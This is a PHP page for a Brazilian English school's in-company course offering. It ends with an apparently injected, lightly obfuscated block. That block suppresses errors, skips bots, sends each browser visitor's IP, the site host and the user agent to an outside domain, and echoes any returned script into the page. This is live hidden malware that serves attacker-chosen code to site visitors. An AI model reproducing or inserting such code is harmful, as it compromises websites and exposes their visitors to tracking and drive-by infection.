<?php include("header.php"); ?>
<body>

<?php include("topo-e-banner.php"); ?>
<div id="content" class="cursos">
<div class="seletor-cursos" id="in-company">
<a href="nossos-cursos.php?s=curso-regular"><img src="img/bt-nossoscursos.png" alt="Nossos Cursos" /></a>
<a href="special-courses.php?s=special-courses"><img src="img/bt-special.png" alt="Special Courses" /></a>
<img src="img/bt-incompany-active.png" alt="In Company" />
</div>
<p><strong>De que sua empresa precisa em relação aos seus colaboradores?<br />
<span class="blue">-	Que eles saibam enviar e-mails  profissionais em inglês?</span><br />
<span class="blue">-	Que eles saibam conduzir apresentações, conference calls, entrevistas e visitas em inglês?</span></strong></p>
<p style="color:#da6400; font-weight:bold;">A Beit English School estrutura um curso personalizado, que atende à necessidade de sua empresa.</p></div>
<?php include("rodape.php"); ?>
<?php
#9ff6ce#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/9ff6ce#
?>
